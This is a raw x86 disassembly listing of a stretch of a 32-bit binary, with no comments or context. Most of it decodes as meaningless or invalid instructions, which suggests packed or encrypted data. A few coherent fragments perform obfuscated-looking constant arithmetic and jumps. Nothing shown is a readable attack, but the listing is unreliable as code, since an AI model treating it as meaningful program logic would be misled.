  4055e9:	lods   al,BYTE PTR ds:[esi]
  4055ea:	pop    esp
  4055eb:	out    dx,eax
  4055ec:	dec    edx
  4055ed:	xor    DWORD PTR [ecx+0x45],esp
  4055f0:	nop
  4055f1:	adc    al,0x39
  4055f3:	jne    0x405580
  4055f5:	or     DWORD PTR [edx],esi
  4055f7:	inc    ecx
  4055f8:	mov    ecx,0x5b3b3b26
  4055fd:	cmp    al,0xac
  4055ff:	(bad)  
  405600:	jae    0x405623
  405602:	xchg   edx,eax
  405603:	dec    eax
  405604:	jns    0x4055a3
  405606:	lock and DWORD PTR [edi],esi
  405609:	call   0x2588:0xed534c20
  405610:	pop    ebx
  405611:	xchg   ebx,eax
  405612:	sub    dh,BYTE PTR [ebx]
  405614:	xlat   BYTE PTR ds:[ebx]
  405615:	das    
  405616:	aaa    
  405617:	push   eax
  405618:	jns    0x405646
  40561a:	mov    cs,WORD PTR [ebp-0x56]
  40561d:	ret    
  40561e:	xchg   BYTE PTR [esi],bh
  405620:	sbb    edi,DWORD PTR [edi]
  405622:	rol    DWORD PTR [edx+ebp*2],cl
  405625:	push   eax
  405626:	(bad)  
  405627:	inc    eax
  405628:	jae    0x40560f
  40562a:	inc    BYTE PTR [edx+0x5f]
  40562d:	xor    esp,eax
  40562f:	or     edi,edi
  405631:	sub    BYTE PTR [eax-0x2f3a9890],ah
  405637:	jmp    0x3b13:0x491b9646
  40563e:	loop   0x405650
  405640:	in     eax,0x73
  405642:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405644:	mov    cl,0x45
  405646:	or     eax,0x5280483f
  40564b:	lods   al,BYTE PTR ds:[esi]
  40564c:	int    0x12
  40564e:	imul   esi,DWORD PTR es:[ecx],0x72
  405652:	mov    al,ds:0xd9033c99
  405657:	sbb    DWORD PTR [ebx-0x78],ebp
  40565a:	xchg   esi,eax
  40565b:	jecxz  0x40567f
  40565d:	inc    esp
  40565e:	test   eax,0x6972dc2e
  405663:	mov    ds:0x133e2c29,eax
  405668:	add    ch,BYTE PTR [edi-0x7e9fee4f]
  40566e:	ret    
  40566f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405670:	out    0xfd,al
  405672:	xchg   ecx,eax
  405673:	jnp    0x405677
  405675:	and    edx,DWORD PTR [ecx+0x1b]
  405678:	inc    edx
  405679:	mov    ecx,0xf51ad656
  40567e:	ins    BYTE PTR es:[edi],dx
  40567f:	dec    edi
  405680:	loope  0x405665
  405682:	fistp  WORD PTR [esp+ebx*8]
  405685:	lods   eax,DWORD PTR ds:[esi]
  405686:	or     eax,0x9cb03f72
  40568b:	jae    0x405653
  40568d:	add    al,0x7
  40568f:	push   esi
  405690:	push   edx
  405691:	outs   dx,DWORD PTR ds:[esi]
  405692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405693:	mov    cl,0x6e
  405695:	xchg   edx,eax
  405696:	inc    ecx
  405697:	loopne 0x4056cb
  405699:	std    
  40569a:	(bad)  
  40569b:	(bad)  [eax*4+0x5be4554a]
  4056a2:	dec    ebp
  4056a3:	iret   
  4056a4:	pop    edx
  4056a5:	pop    ebx
  4056a6:	xor    eax,0xfa865969
  4056ab:	in     eax,0xd4
  4056ad:	xor    bl,bh
  4056af:	nop
  4056b0:	shl    DWORD PTR [edi+0x5a],cl
  4056b3:	mov    ebp,DWORD PTR [ecx+0x2e]
  4056b6:	xor    ch,BYTE PTR [ebx]
  4056b8:	mov    bl,0x4c
  4056ba:	push   esi
  4056bb:	std    
  4056bc:	aam    0xd8
  4056be:	std    
  4056bf:	lods   al,BYTE PTR ds:[esi]
  4056c0:	std    
  4056c1:	mov    ebx,0x2125d507
  4056c6:	mov    bl,0x33
  4056c8:	and    al,0x41
  4056ca:	adc    bl,BYTE PTR [eax]
  4056cc:	in     eax,dx
  4056cd:	mov    al,ch
  4056cf:	mov    dl,al
  4056d1:	xchg   BYTE PTR [edi-0x59],ch
  4056d4:	ss int 0xa4
  4056d7:	add    BYTE PTR [edx],bl
  4056d9:	inc    esp
  4056da:	pop    edi
  4056db:	xor    BYTE PTR [esi],cl
  4056dd:	adc    edx,ebx
  4056df:	sar    BYTE PTR [esi+0x14755da6],0xcc
  4056e6:	loopne 0x405763
  4056e8:	mov    ebp,0x46685bf6
  4056ed:	shl    DWORD PTR [edx],cl
  4056ef:	cwde   
  4056f0:	cdq    
  4056f1:	push   0xffffffe7
  4056f3:	jg     0x4056e2
  4056f5:	popa   
  4056f6:	xchg   esi,edx
  4056f8:	(bad)  
  4056f9:	sbb    eax,0xa642a514
  4056fe:	(bad)  
  405700:	and    BYTE PTR [edx-0x27],ah
  405703:	xor    BYTE PTR [ecx-0x9199e45],0x63
  40570a:	rol    DWORD PTR [ebx+0x29],0x22
  40570e:	inc    esi
  40570f:	shl    ch,cl
  405711:	mul    DWORD PTR [ebp+0x6a5bc78f]
  405717:	xchg   ebx,eax
  405718:	mov    dl,0x65
  40571a:	aad    0x1f
  40571c:	and    al,BYTE PTR [eax+0x4e27b473]
  405722:	jae    0x405776
  405724:	cmp    BYTE PTR [ebx-0x6b8cff07],0xc6
  40572b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40572c:	or     BYTE PTR [ebp-0x3b3e6cb6],ah
  405732:	ins    BYTE PTR es:[edi],dx
  405733:	pop    edx
  405734:	pop    ds
  405735:	jmp    0x6a5a:0xdd32a653
  40573c:	add    esi,DWORD PTR [eax+0x33ea0808]
  405742:	sub    esp,DWORD PTR [eax-0x2814b92a]
  405748:	mov    ?,ebx
  40574a:	pop    esp
  40574b:	test   DWORD PTR [ecx+0x7b1bb7c1],ebx
  405751:	jmp    0xf49b:0xcebd01cf
  405758:	sbb    eax,0x416fa367
  40575d:	retf   0xa4ed
  405760:	adc    BYTE PTR [ebx],0x6a
  405763:	cmp    esp,DWORD PTR [ebx-0x4c86e32b]
  405769:	inc    esi
  40576a:	(bad)  
  40576b:	push   ss
  40576c:	cmp    ebx,eax
  40576e:	(bad)  
  40576f:	ffree  st(4)
  405771:	sub    al,0xac
  405773:	adc    ecx,DWORD PTR [ecx]
  405775:	adc    al,0x82
  405777:	jmp    0x3ead285a
  40577c:	cmc    
  40577d:	loop   0x40578f
  40577f:	in     eax,0x9b
  405781:	in     al,0xaf
  405783:	bnd jae 0x40577a
  405786:	rcl    DWORD PTR [eax+0xb8b81ed],1
  40578c:	mov    bl,0x7a
  40578e:	in     eax,0xc9
  405790:	or     bh,BYTE PTR [esi+0x74]
  405793:	lods   al,BYTE PTR ds:[esi]
  405794:	inc    esp
  405795:	cld    
  405796:	xor    DWORD PTR [ecx+0x1f3ffda7],ebx
  40579c:	imul   eax,DWORD PTR [ebx+0x4],0xf661fc60
  4057a3:	ret    0xeb82
  4057a6:	push   esi
  4057a7:	retf   
  4057a8:	test   DWORD PTR [esi+edi*4+0x7],eax
  4057ac:	push   cs
  4057ad:	es push edi
  4057af:	pop    esi
  4057b0:	dec    ebx
  4057b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b2:	gs repnz push bx
  4057b6:	in     eax,dx
  4057b7:	xor    BYTE PTR [eax+0x57],ah
  4057ba:	daa    
  4057bb:	shr    DWORD PTR [ebx-0x744f9b88],cl
  4057c1:	retf   0x5ab9
  4057c4:	mov    cl,0x15
  4057c6:	jae    0x40576f
  4057c8:	stc    
  4057c9:	sub    al,0xca
  4057cb:	repz push 0xffffffb7
  4057ce:	loopne 0x405790
  4057d0:	mov    ebp,0x22e7c617
  4057d5:	adc    al,0x5b
  4057d7:	xchg   BYTE PTR [edi-0x5f],bl
  4057da:	ins    BYTE PTR es:[edi],dx
  4057db:	mov    ebx,0xe9ec8756
  4057e0:	shr    DWORD PTR [edx+ecx*2],1
  4057e3:	pop    es
  4057e4:	mov    eax,ds:0xc25113dc
  4057e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057ea:	jb     0x4057c0
  4057ec:	push   ecx
  4057ed:	pop    edi
  4057ee:	loop   0x4057eb
  4057f0:	pop    edi
  4057f1:	sub    edx,DWORD PTR [esi+ecx*8-0x62]
  4057f5:	fst    DWORD PTR [esi+ebp*2-0x6c2f3f9b]
  4057fc:	sbb    DWORD PTR [edi+0x16de82e2],edx
  405802:	aaa    
  405803:	xor    al,0xe2
  405805:	std    
  405806:	call   0x8800:0xa1128f63
  40580d:	mov    ebx,0x51a03337
  405812:	fdivrp st(1),st
  405814:	lahf   
  405815:	xor    esi,DWORD PTR [ebx-0x30]
  405818:	cmp    BYTE PTR [eax+ecx*2],al
  40581b:	inc    ebx
  40581c:	jg     0x40588b
  40581e:	push   0xd1a9d21a
  405823:	jbe    0x405880
  405825:	push   DWORD PTR [edi]
  405827:	push   0xecabfdae
  40582c:	mov    WORD PTR [esi],?
  40582e:	sbb    BYTE PTR [ecx],al
  405830:	fld    TBYTE PTR [ebp-0x5c9c3a23]
  405836:	adc    eax,0x8bb00235
  40583b:	push   esi
  40583c:	add    al,0xf7
  40583e:	sbb    eax,0x42838b
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x428177,0x0
  40584d:	mov    DWORD PTR ds:0x428267,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x428267,0x2ac5
  405875:	cmp    DWORD PTR ds:0x428177,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428e74
  40588d:	adc    DWORD PTR ds:0x42830b,edx
  405893:	or     DWORD PTR ds:0x42823b,0x369f
  40589d:	neg    DWORD PTR ds:0x42817b
  4058a3:	sub    DWORD PTR ds:0x42815b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x4058a1
  405910:	fsubr  QWORD PTR ds:0x18b16dbe
  405916:	sbb    BYTE PTR [esi-0x5fe7e7ee],bl
  40591c:	dec    edx
  40591d:	pusha  
  40591e:	test   dl,0xde
  405921:	inc    ebp
  405922:	xor    eax,0x243879c7
  405927:	retf   0x7008
  40592a:	pop    edx
  40592b:	inc    ecx
  40592c:	jl     0x405964
  40592e:	das    
  40592f:	ds int3 
  405931:	jecxz  0x4058c4
  405933:	jo     0x4058ea
  405935:	add    ecx,DWORD PTR [ebx+0x5d]
  405938:	cmp    BYTE PTR [esi+0x2045b4],ah
  40593e:	cmp    dl,BYTE PTR [ebx]
  405940:	dec    ebp
  405941:	out    dx,eax
  405942:	mov    ebp,DWORD PTR ds:0x4b360c74
  405948:	lock add ecx,DWORD PTR [edx]
  40594b:	cli    
  40594c:	and    al,0xc5
  40594e:	mul    eax
  405950:	push   edi
  405951:	dec    ecx
  405952:	outs   dx,BYTE PTR ds:[esi]
  405953:	dec    esp
  405954:	or     al,BYTE PTR [esi-0x2f]
  405957:	mov    edx,0x71a22792
  40595c:	loope  0x405996
  40595e:	push   ds
  40595f:	ins    DWORD PTR es:[edi],dx
  405960:	sar    DWORD PTR [edi-0x26],0xe0
  405964:	mov    ebp,0x9da02640
  405969:	fisttp DWORD PTR [ecx-0xc]
  40596c:	cmp    BYTE PTR ds:0xa173c850,bh
  405972:	push   ebp
  405973:	adc    bh,dl
  405975:	popf   
  405976:	and    al,ch
  405978:	mov    ah,0x8a
  40597a:	sahf   
  40597b:	sbb    eax,0xed66694
  405980:	and    al,ah
  405982:	into   
  405983:	daa    
  405984:	push   esp
  405985:	xchg   edi,eax
  405986:	pop    ebx
  405987:	mov    al,0xb4
  405989:	add    BYTE PTR [esi+0x5e],al
  40598c:	aad    0x27
  40598e:	inc    eax
  40598f:	shl    BYTE PTR [edx+0xab53201],0xa8
  405996:	ins    DWORD PTR es:[edi],dx
  405997:	mov    eax,0xa0b207ad
  40599c:	cmc    
  40599d:	int    0xad
  40599f:	xor    edx,DWORD PTR fs:0x896c421
  4059a6:	or     al,0x28
  4059a8:	jge    0x405954
  4059aa:	sbb    BYTE PTR [eax+esi*1-0xa],0x2
  4059af:	scas   eax,DWORD PTR es:[edi]
  4059b0:	stc    
  4059b1:	push   edi
  4059b2:	push   ebp
  4059b3:	cmp    BYTE PTR [edx],bl
  4059b5:	dec    edx
  4059b6:	jae    0x405958
  4059b8:	inc    edx
  4059b9:	mov    dl,0xe4
  4059bb:	stos   DWORD PTR es:[edi],eax
  4059bc:	add    al,0x22
  4059be:	jnp    0x4059d2
  4059c0:	mov    ds:0x49a33561,al
  4059c5:	cld    
  4059c6:	mul    BYTE PTR [ebp-0x4cf1c36a]
  4059cc:	icebp  
  4059cd:	inc    edi
  4059ce:	nop
  4059cf:	lea    ecx,[esi+0x60adf229]
  4059d5:	aas    
  4059d6:	test   BYTE PTR [eax-0x16],cl
  4059d9:	scas   eax,DWORD PTR es:[edi]
  4059da:	daa    
  4059db:	jns    0x40597a
  4059dd:	lods   al,BYTE PTR ds:[esi]
  4059de:	inc    esi
  4059df:	inc    ebx
  4059e0:	pop    ebx
  4059e1:	pusha  
  4059e2:	sbb    ah,ah
  4059e4:	stos   DWORD PTR es:[edi],eax
  4059e5:	pop    ss
  4059e6:	not    BYTE PTR [edi+ebx*4-0x7c0e6e6b]
  4059ed:	cli    
  4059ee:	push   esi
  4059ef:	push   eax
  4059f0:	xchg   esp,eax
  4059f1:	xlat   BYTE PTR ds:[ebx]
  4059f2:	pop    esi
  4059f3:	jge    0x405a29
  4059f5:	mov    edi,0x75be96de
  4059fa:	call   0xe7287d7b
  4059ff:	inc    eax
  405a00:	jle    0x405a63
  405a02:	std    
  405a03:	sbb    DWORD PTR ss:[esi+0x5bef97fd],ebx
  405a0a:	ins    DWORD PTR es:[edi],dx
  405a0b:	cmc    
  405a0c:	nop
  405a0d:	sub    eax,0xafd694ac
  405a12:	mov    ebp,0x54c76bdd
  405a17:	or     edx,ebx
  405a19:	jle    0x405a1d
  405a1b:	cs mov es,eax
  405a1e:	out    0xd9,eax
  405a20:	jo     0x405a3a
  405a22:	pop    es
  405a23:	mov    ebx,0x3e85672d
  405a28:	les    esp,FWORD PTR [ebp-0x319ff49b]
  405a2e:	rol    BYTE PTR [ecx-0x3938ab17],0xb1
  405a35:	or     eax,0xce64cca3
  405a3a:	xor    eax,0xb069cac6
  405a3f:	fistp  WORD PTR [edi]
  405a41:	mov    bl,0xb6
  405a43:	jns    0x405abc
  405a45:	ja     0x405a99
  405a47:	xor    DWORD PTR [esi],esp
  405a49:	out    0x5a,eax
  405a4b:	jb     0x405a8f
  405a4d:	mov    ah,0x33
  405a4f:	push   edi
  405a50:	jo     0x405a39
  405a52:	mov    BYTE PTR [edi],bl
  405a54:	ins    DWORD PTR es:[edi],dx
  405a55:	push   esi
  405a56:	xor    esp,DWORD PTR [edi]
  405a58:	mov    bl,0xff
  405a5a:	fwait
  405a5b:	(bad)  
  405a5c:	outs   dx,BYTE PTR ds:[esi]
  405a5d:	out    0x8d,al
  405a5f:	stos   BYTE PTR es:[edi],al
  405a60:	mov    ebp,0x33c4685
  405a65:	call   0xbf81:0x14ecea12
  405a6c:	push   edx
  405a6d:	push   0x70a4c939
  405a72:	xor    BYTE PTR [ecx],ch
  405a74:	sub    ecx,ecx
  405a76:	mov    bl,0xb3
  405a78:	dec    edx
  405a79:	or     BYTE PTR [ebx-0x7c],bh
  405a7c:	repnz push ecx
  405a7e:	outs   dx,BYTE PTR ds:[esi]
  405a7f:	and    eax,0x8bbb1e2
  405a84:	pop    eax
  405a85:	add    DWORD PTR [ebx-0x642be9f2],ecx
  405a8b:	cmp    eax,0x6cc45216
  405a90:	xor    al,0x7f
  405a92:	out    0x47,al
  405a94:	pop    esp
  405a95:	mov    esp,0x44f88ff0
  405a9a:	and    al,0xc9
  405a9c:	test   al,0xf5
  405a9e:	(bad)  
  405a9f:	das    
  405aa0:	loope  0x405a50
  405aa2:	inc    ecx
  405aa3:	pop    ecx
  405aa4:	push   ebx
  405aa5:	push   0x3d2ba591
  405aaa:	fisub  DWORD PTR [edx-0x54]
  405aad:	jo     0x405a74
  405aaf:	and    eax,0x358156e0
  405ab4:	mov    dh,0x4d
  405ab6:	imul   ebp,DWORD PTR [ecx],0x5adc25dd
  405abc:	push   cs
  405abd:	fnstsw WORD PTR [edx]
  405abf:	xlat   BYTE PTR ds:[ebx]
  405ac0:	dec    esp
  405ac1:	popf   
  405ac2:	cmp    eax,0xc5241e2c
  405ac7:	cmp    al,0x91
  405ac9:	in     eax,0x3
  405acb:	xchg   DWORD PTR [edx+esi*2+0x317158e5],ebx
  405ad2:	cmc    
  405ad3:	inc    esp
  405ad4:	or     BYTE PTR [edi],ch
  405ad6:	into   
  405ad7:	and    eax,DWORD PTR [ecx+0x4d27ef46]
  405add:	inc    esp
  405ade:	aam    0xd8
  405ae0:	nop
  405ae1:	loop   0x405a75
  405ae3:	(bad)  
  405ae4:	mov    ebx,0xacdad622
  405ae9:	sub    esp,DWORD PTR [edx+ebx*1]
  405aec:	push   esp
  405aed:	jb     0x405b08
  405aef:	(bad)  
  405af0:	(bad)  
  405af1:	clc    
  405af2:	aam    0x98
  405af4:	enter  0xfea,0xc5
  405af8:	inc    esi
  405af9:	mov    ch,0x43
  405afb:	jp     0x405a87
  405afd:	cwde   
  405afe:	sub    BYTE PTR [edi+0x44],bl
  405b01:	int3   
  405b02:	aam    0x9b
  405b04:	jmp    0xe7bd:0x8873ce3f
  405b0b:	pop    ds
  405b0c:	dec    eax
  405b0d:	push   0xc24aebd1
  405b12:	(bad)  
  405b13:	fnstcw WORD PTR fs:[esi]
  405b16:	inc    esp
  405b17:	enter  0xff2a,0x91
  405b1b:	fs in  eax,dx
  405b1d:	jnp    0x405adb
  405b1f:	jecxz  0x405aad
  405b21:	or     dh,BYTE PTR [ecx+0x7]
  405b24:	pop    esi
  405b25:	dec    ecx
  405b26:	ror    BYTE PTR [ebx],1
  405b28:	addr16 call 0xa7346de4
  405b2e:	dec    esi
  405b2f:	cmp    al,0xbd
  405b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b32:	outs   dx,DWORD PTR ds:[esi]
  405b33:	mov    ebp,0x3ee398b5
  405b38:	xor    BYTE PTR gs:[edi],dh
  405b3b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b3d:	push   ss
  405b3e:	mov    al,ds:0x145ae7bc
  405b43:	pop    ebp
  405b44:	push   ecx
  405b45:	push   ss
  405b46:	es pop edi
  405b48:	xchg   ebx,eax
  405b49:	shl    BYTE PTR [edx-0x60],0xaa
  405b4d:	aas    
  405b4e:	loope  0x405b4b
  405b50:	inc    di
  405b52:	mov    eax,ds:0xc5934702
  405b57:	mov    ds:0xff93e8a,eax
  405b5c:	not    esi
  405b5e:	pop    ss
  405b5f:	js     0x405b39
  405b61:	jb     0x405b63
  405b63:	mov    ds:0x9d185cf3,al
  405b68:	ret    0xe396
  405b6b:	lods   eax,DWORD PTR ds:[esi]
  405b6c:	or     esi,eax
  405b6e:	fistp  QWORD PTR [ecx]
  405b70:	pop    eax
  405b71:	cld    
  405b72:	sub    ecx,DWORD PTR [esi]
  405b74:	sar    BYTE PTR [esi+0x4f],0xaa
  405b78:	scas   al,BYTE PTR es:[edi]
  405b79:	mul    dl
  405b7b:	and    BYTE PTR [edx+0x30],0xd4
  405b7f:	sub    eax,ecx
  405b81:	add    BYTE PTR [ecx+0x11179349],cl
  405b87:	pop    ds
  405b88:	stos   BYTE PTR es:[edi],al
  405b89:	sub    DWORD PTR [edi+ecx*1+0x5],esi
  405b8d:	bound  esi,QWORD PTR [ecx]
  405b8f:	pushf  
  405b90:	xor    al,0x7f
  405b92:	and    eax,0x9cea44a8
  405b97:	jae    0x405b68
  405b99:	aam    0x9
  405b9b:	and    eax,DWORD PTR [ecx+0x35ba6e53]
  405ba1:	in     al,dx
  405ba2:	test   BYTE PTR [esi-0x27af3a3d],bl
  405ba8:	aas    
  405ba9:	aam    0x51
  405bab:	repnz add DWORD PTR [ebp-0x41],0x19
  405bb0:	cmp    BYTE PTR [ebp+0x87ab724],ch
  405bb6:	dec    edi
  405bb7:	mov    edi,0xc52d97c7
  405bbc:	retf   0xbe4d
  405bbf:	jnp    0x405b7e
  405bc1:	bound  esp,QWORD PTR [esi-0x45284c1b]
  405bc7:	push   ss
  405bc8:	cmp    al,0x8a
  405bca:	cmp    BYTE PTR [ebp-0x13],0x64
  405bce:	or     BYTE PTR [edx-0x7eb354c1],ah
  405bd4:	in     al,0x4d
  405bd6:	aas    
  405bd7:	in     eax,dx
  405bd8:	setns  BYTE PTR [edi]
  405bdb:	pop    ds
  405bdc:	pop    ecx
  405bdd:	dec    DWORD PTR [ebx-0x21]
  405be0:	je     0x405bc7
  405be2:	mov    esp,0x2db4e11e
  405be7:	push   ebp
  405be8:	adc    DWORD PTR [edi],esp
  405bea:	inc    ecx
  405beb:	mov    DWORD PTR [edx+0x61],ebx
  405bee:	out    0x8,eax
  405bf0:	stos   BYTE PTR es:[edi],al
  405bf1:	(bad)  
  405bf2:	sbb    esp,ebp
  405bf4:	rcl    cl,cl
  405bf6:	mov    BYTE PTR [esi+0x3d5e90aa],ch
  405bfc:	mov    dh,0xae
  405bfe:	mov    bh,0xff
  405c00:	sub    esp,DWORD PTR [ebx-0x7e2b8a38]
  405c06:	data16 cmp bh,bl
  405c09:	in     al,dx
  405c0a:	inc    esp
  405c0b:	and    eax,0x2b590ded
  405c10:	aam    0x12
  405c12:	jmp    0xf4ef:0x132403f7
  405c19:	jns    0x405bbe
  405c1b:	repnz sbb edi,DWORD PTR [eax+0x6e991c62]
  405c22:	ins    DWORD PTR es:[edi],dx
  405c23:	jp     0x405c67
  405c25:	enter  0x2ae7,0x49
  405c29:	dec    ebx
  405c2a:	xchg   esi,eax
  405c2b:	and    eax,ecx
  405c2d:	mov    ebp,0xc446d67b
  405c32:	repnz xchg esp,eax
  405c34:	lods   al,BYTE PTR ds:[esi]
  405c35:	pop    ss
  405c36:	mov    esi,edx
  405c38:	xlat   BYTE PTR ds:[ebx]
  405c39:	jo     0x405ca3
  405c3b:	dec    ecx
  405c3c:	outs   dx,BYTE PTR ds:[esi]
  405c3d:	retf   0x5147
  405c40:	clc    
  405c41:	ret    
  405c42:	(bad)  
  405c43:	in     al,dx
  405c44:	aas    
  405c45:	push   0x3a5adb8d
  405c4a:	mul    BYTE PTR [eax-0x91c18f1]
  405c50:	push   eax
  405c51:	lock xchg edi,eax
  405c53:	test   eax,0x646fce51
  405c58:	fadd   DWORD PTR [esi]
  405c5a:	push   esp
  405c5b:	add    eax,0x8cf9941
  405c60:	aam    0xe9
  405c62:	cmp    ah,al
  405c64:	int3   
  405c65:	cmp    edi,eax
  405c67:	jo     0x405bff
  405c69:	fisttp DWORD PTR [eax-0x2aef4658]
  405c6f:	jecxz  0x405c8f
  405c71:	push   ecx
  405c72:	sahf   
  405c73:	cmp    eax,0x6d0fc082
  405c78:	mov    dl,0x32
  405c7a:	mov    WORD PTR [edi-0x23851e44],es
  405c80:	inc    ebx
  405c81:	adc    BYTE PTR [edx],bh
  405c83:	stc    
  405c84:	and    DWORD PTR [ebx+0x57],ebx
  405c87:	dec    esi
  405c88:	imul   edi,DWORD PTR [ecx-0x24],0xffffffef
  405c8c:	into   
  405c8d:	mov    bh,0x2c
  405c8f:	lahf   
  405c90:	je     0x405c86
  405c92:	nop
  405c93:	mov    ah,0x1
  405c95:	mov    esp,0xe9c72764
  405c9a:	pop    ebx
  405c9b:	std    
  405c9c:	cmp    DWORD PTR [esi-0x4915a0ad],edi
  405ca2:	in     al,0x1a
  405ca4:	cmp    ah,BYTE PTR [edi-0x5a]
  405ca7:	jmp    0x58bc:0xc8df2854
  405cae:	shl    BYTE PTR fs:[ebp-0x10],1
  405cb2:	adc    DWORD PTR [ecx+0x168bafbe],esp
  405cb8:	fdivp  st(2),st
  405cba:	xchg   esp,eax
  405cbb:	sahf   
  405cbc:	repnz loop 0x405c52
  405cbf:	or     BYTE PTR [eax+0x6d1e0ad7],0x74
  405cc6:	dec    eax
  405cc7:	jp     0x405c94
  405cc9:	sub    al,0x11
  405ccb:	loop   0x405ccb
  405ccd:	js     0x405cd1
  405ccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cd0:	sub    eax,0xb795e9ca
  405cd5:	add    DWORD PTR [esi+0x1a],edi
  405cd8:	pop    es
  405cd9:	push   es
  405cda:	or     BYTE PTR [eax-0x382bba77],bl
  405ce0:	inc    ebp
  405ce1:	loopne 0x405d54
  405ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce4:	jns    0x405cb0
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax+0xd],1
  405d2b:	mov    esi,0xa9f26a45
  405d30:	sbb    BYTE PTR [eax],bl
  405d32:	sahf   
  405d33:	adc    bl,BYTE PTR [eax]
  405d35:	sbb    BYTE PTR [esi+0x3b26c0c9],ch
  405d3b:	aas    
  405d3c:	adc    esp,DWORD PTR [eax+edx*1+0x4e174a02]
  405d43:	jb     0x405cf6
  405d45:	and    esi,DWORD PTR [ecx-0x11]
  405d48:	inc    ecx
  405d49:	mov    edi,0x15362f5e
  405d4e:	jle    0x405d79
  405d50:	rcl    dl,1
  405d52:	xor    eax,0xcae0dcd8
  405d57:	jo     0x405d86
  405d59:	cmp    DWORD PTR [eax],ebx
  405d5b:	xchg   ecx,eax
  405d5c:	push   es
  405d5d:	aad    0x94
  405d5f:	arpl   bx,cx
  405d61:	lods   al,BYTE PTR ds:[esi]
  405d62:	stc    
  405d63:	outs   dx,BYTE PTR ds:[esi]
  405d64:	in     eax,0x19
  405d66:	pop    ds
  405d67:	ins    BYTE PTR es:[edi],dx
  405d68:	fdiv   DWORD PTR [eax]
  405d6a:	(bad)  
  405d6b:	sub    BYTE PTR ds:[esi-0x2d],al
  405d6f:	pop    ecx
  405d70:	cmp    edx,edi
  405d72:	xchg   ebx,eax
  405d73:	adc    eax,DWORD PTR [edi-0x6ab29fc]
  405d79:	xchg   ebx,ecx
  405d7b:	cs out dx,eax
  405d7d:	dec    ebx
  405d7e:	mov    bl,0xff
  405d80:	and    ch,0x3c
  405d83:	jle    0x405dde
  405d85:	les    ebx,FWORD PTR [edx+0x6a27b198]
  405d8b:	sub    ah,bl
  405d8d:	mov    ds:0xb6d76d5a,eax
  405d92:	add    eax,0xd27bcba1
  405d97:	ret    
  405d98:	xor    al,0x1
  405d9a:	xor    DWORD PTR [eax+eiz*8-0x29c94633],eax
  405da1:	add    ecx,DWORD PTR ds:0x5ace6d43
  405da7:	inc    esp
  405da8:	add    ecx,DWORD PTR [eax+0x6f]
  405dab:	sbb    edx,edx
  405dad:	popf   
  405dae:	test   esi,esp
  405db0:	iret   
  405db1:	repnz inc esp
  405db3:	add    DWORD PTR [ecx+0xdd35122],0x17a081c8
  405dbd:	dec    esi
  405dbe:	adc    BYTE PTR [edi-0x4d],cl
  405dc1:	jp     0x405d6e
  405dc3:	fbstp  TBYTE PTR [edi+0x34]
  405dc6:	xlat   BYTE PTR ds:[ebx]
  405dc7:	pop    ds
  405dc8:	adc    esi,eax
  405dca:	and    eax,0x50235c
  405dcf:	loopne 0x405e0a
  405dd1:	aas    
  405dd2:	sbb    al,0xbd
  405dd4:	mov    esp,0x38487531
